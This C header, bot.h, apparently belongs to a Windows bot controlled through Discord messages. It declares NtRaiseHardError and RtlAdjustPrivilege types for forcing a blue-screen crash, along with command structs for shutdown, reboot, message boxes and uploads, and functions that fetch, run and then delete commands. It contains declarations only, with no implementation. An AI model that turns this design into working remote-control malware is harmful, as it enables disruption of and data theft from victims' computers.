#ifndef BOT_H
#define BOT_H

#include "env.h"
#include <ntstatus.h>

typedef NTSTATUS (NTAPI *RtlAdjustPrivilege_t)(
    ULONG Privilege,
    BOOLEAN Enable,
    BOOLEAN CurrentThread,
    BOOLEAN *Enabled
);

typedef NTSTATUS (NTAPI *NtRaiseHardError_t)(
    NTSTATUS ErrorStatus,
    ULONG NumberOfParameters,
    ULONG UnicodeStringParameterMask,
    ULONG_PTR *Parameters,
    ULONG ValidResponseOptions,
    ULONG *Response
);

typedef enum {
    MSGBOX_TYPE_INFO,
    MSGBOX_TYPE_WARN,
    MSGBOX_TYPE_ERROR
} MsgBoxType;

typedef struct {
    char title[128];
    char text[512];
    MsgBoxType type;
} MsgBoxRequest;

typedef enum {
    SHUTDOWN_TYPE_NONE = 0,
    SHUTDOWN_TYPE_LOGOFF,
    SHUTDOWN_TYPE_REBOOT,
    SHUTDOWN_TYPE_POWEROFF,
    SHUTDOWN_TYPE_SLEEP,
    SHUTDOWN_TYPE_BSOD,
} ShutDownRequest;

typedef struct {
    uint64_t killswitch;    // confirm code to activate
    int disabled;           // -1 = none, 0 = disabled, 1 = enabled
    MsgBoxRequest msgbox;
    ShutDownRequest shutdown;
    bool __executed;
    char __id[32];          // Discord message ID
} Command;

void send_dc_msg(char* msg_text);
void get_commands_to_exec(Command* out, int* out_count);
void process_commands();
void process_uploads();
void delete_executed_messages(Command* cmds, int count);
void init_bot();

#endif /* BOT_H */